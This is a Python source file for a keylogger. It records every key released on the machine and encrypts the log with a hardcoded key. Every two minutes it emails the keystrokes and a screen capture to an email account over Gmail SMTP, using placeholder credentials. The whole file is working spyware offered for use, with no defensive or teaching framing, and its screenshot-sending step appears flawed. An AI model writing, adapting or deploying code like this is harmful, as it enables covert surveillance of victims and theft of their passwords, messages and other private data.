from pynput.keyboard import Key, Listener
from smtplib import SMTP, SMTPAuthenticationError
from threading import Timer
from cryptography.fernet import Fernet
import pyscreenshot

EMAIL_ADDRESS = "YOUR_EMAIL"
EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
SEND_REPORT_EVERY = 120  # seconds
EMAIL_HOST = "smtp.gmail.com"
PORT = 587
SECRET = b"F1C7ZQ1ThDSpmw13fKWT_gS-rjkl0HwdDo4Wxo63R2k="


class Keylogger:
    ks = {
        Key.space: " ",
        Key.enter: "[ENTER]\n",
        Key.esc: "[ESC]",
        Key.tab: "[TAB]",
        Key.backspace: "[BACKSPACE]"}

    def __init__(self, email, password, time_interval, secret):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password
        self.f = Fernet(secret)

    def update_log(self, str):
        self.log += str

    def on_release(self, key):
        try:
            name = key.char
        except AttributeError:
            name = Keylogger.ks.get(key, str(key))
        self.update_log(name.replace("'", ""))

    def encrypt_log(self):
        return self.f.encrypt(str.encode(f"\n\n{self.log}"))

    def send_email(self, message):
        server = SMTP(host=EMAIL_HOST, port=PORT)
        # connect to the SMTP server as TLS mode
        server.starttls()
        try:
            email = self.email
            server.login(email, self.password)
            server.sendmail(email, email, message)
        except SMTPAuthenticationError:
            print("Username and Password not accepted.")
        finally:
            server.quit()

    def send_keys(self):
        self.send_email(self.encrypt_log())

    def send_screenshot(self):
        self.send_email(pyscreenshot.grab())

    def report(self):
        self.send_keys()
        self.send_screenshot()
        self.log = ""
        timer = Timer(self.interval, self.report)
        timer.start()

    def start(self):
        # collect events until released
        with Listener(on_release=self.on_release) as listener:
            self.report()
            listener.join()


def main():
    kl = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY, SECRET)
    kl.start()


if __name__ == "__main__":
    main()
